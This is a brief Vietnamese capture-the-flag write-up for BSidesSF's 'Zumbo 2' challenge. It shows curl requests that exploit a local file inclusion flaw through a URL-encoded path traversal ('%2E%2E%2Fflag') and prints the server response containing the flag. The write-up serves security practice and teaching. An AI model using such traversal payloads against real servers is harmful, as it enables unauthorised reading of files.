## Zumbo 2

> Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM.
> 
> Three flags await. Can you find them?
> 
> http://zumbo-8ac445b1.ctf.bsidessf.net
>
> Stage 3 - coming soon!

#### WriteUp

Giống như bài [Zumbo 1](./Zumbo_1.md), mình lấy được file [server.py](./lib/server.py).

Nhưng không giống như lần trước, để ý sẽ thấy dòng 
```python
if __name__ == '__main__':
```
Rồi mới `open(/flag)`, tức là muốn đến được với flag thì mình phải đi từ [server.py](./lib/server.py). Vậy thì chỉ có thể dính dáng tới [LFI](https://en.wikipedia.org/wiki/File_inclusion_vulnerability).

Thử xem nào

```
traioi$ curl http://zumbo-8ac445b1.ctf.bsidessf.net/../flag
```
```html
[Errno 2] No such file or directory: u'flag'
<!-- page: flag, src: /code/server.py -->
```

Trật lất, có thể đã được filter, thử encode với `URL encode`.
```
traioi$ curl http://zumbo-8ac445b1.ctf.bsidessf.net/%2E%2E%2Fflag
```

```html
FLAG: RUNNER_ON_SECOND_BASE

<!-- page: ..//flag, src: /code/server.py -->
```

Hihi, flag là `FLAG: RUNNER_ON_SECOND_BASE`.